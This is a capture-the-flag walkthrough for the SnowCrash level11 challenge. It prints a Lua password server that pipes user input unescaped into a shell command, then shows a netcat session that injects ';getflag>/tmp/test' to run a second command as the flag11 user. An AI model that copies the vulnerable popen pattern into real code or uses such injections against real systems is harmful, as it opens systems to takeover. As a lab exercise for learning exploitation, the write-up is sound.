In the user's home directory, we find the code of a Lua server:

```lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

We observe that the server is already running when attempting to launch level11.lua, and we can indeed see port 5151 open in TCP:

```
level11@SnowCrash:~$ ss -tunlp
Netid  State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port 
udp    UNCONN     0      0                      *:68                    *:*     
tcp    LISTEN     0      128                   :::4646                 :::*     
tcp    LISTEN     0      128                   :::4747                 :::*     
tcp    LISTEN     0      128                   :::80                   :::*     
tcp    LISTEN     0      128                   :::4242                 :::*     
tcp    LISTEN     0      128                    *:4242                  *:*     
tcp    LISTEN     0      32             127.0.0.1:5151                  *:* 
```

Here, command injection is possible, starting from the variable ..pass.., in order to execute whatever we want through the server, which was launched with the permissions of the user flag11.

Finally, it is sufficient to connect to the server with nc:

```
nc 127.0.0.1 5151
```

Then redirect the output of the getflag command used by the server to a file in /tmp, for example. This results in the following:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ;getflag>/tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Ressources :

- https://seclists.org/fulldisclosure/2014/May/128
- https://mike-boya.github.io/post/exploit-exercises-nebula-level12/
